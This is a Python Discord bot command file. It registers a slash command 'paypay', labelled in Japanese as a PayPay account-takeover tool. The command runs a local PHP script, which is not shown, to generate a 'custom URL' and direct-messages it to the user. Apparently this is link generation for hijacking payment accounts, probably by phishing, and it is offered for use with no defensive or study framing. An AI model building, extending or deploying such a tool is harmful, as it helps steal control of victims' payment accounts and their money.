import os
from subprocess import run, PIPE
import discord
from discord import app_commands

async def setup_paypay(bot: discord.Client):
    @bot.tree.command(name="paypay", description="PAYPAY乗っ取り悪用厳禁")
    async def paypay(interaction: discord.Interaction):
        try:
            # PHPファイルへのパス
            php_file_path = os.path.join(os.getcwd(), "BOT", "index.php")  # 現在の作業ディレクトリを使用

            # PHPスクリプトを実行してカスタムURLを生成
            result = run(["php", php_file_path], stdout=PIPE, stderr=PIPE, text=True)

            # PHPスクリプトの実行結果を確認
            if result.returncode != 0:
                await interaction.response.send_message("エラーが発生しました。PHPスクリプトが正しく実行されませんでした。", ephemeral=True)
                print(f"PHPエラー: {result.stderr}")
                return

            # PHPスクリプトの出力を取得
            custom_url = result.stdout.strip()

            if not custom_url:
                await interaction.response.send_message("エラー: 生成されたURLが空です。", ephemeral=True)
                return

            # ユーザーにDMを送信
            try:
                await interaction.user.send(f"こちらが生成されたURLです: {custom_url}")
                await interaction.response.send_message("URLをDMに送信しました。", ephemeral=True)
            except discord.Forbidden:
                await interaction.response.send_message("URLをDMで送信できませんでした。DMを有効にしてください。", ephemeral=True)

        except FileNotFoundError:
            await interaction.response.send_message("PHPがインストールされていないか、パスが無効です。", ephemeral=True)
            print("PHPが見つかりませんでした。")
        except Exception as e:
            await interaction.response.send_message("処理中に予期しないエラーが発生しました。", ephemeral=True)
            print(f"エラー: {e}")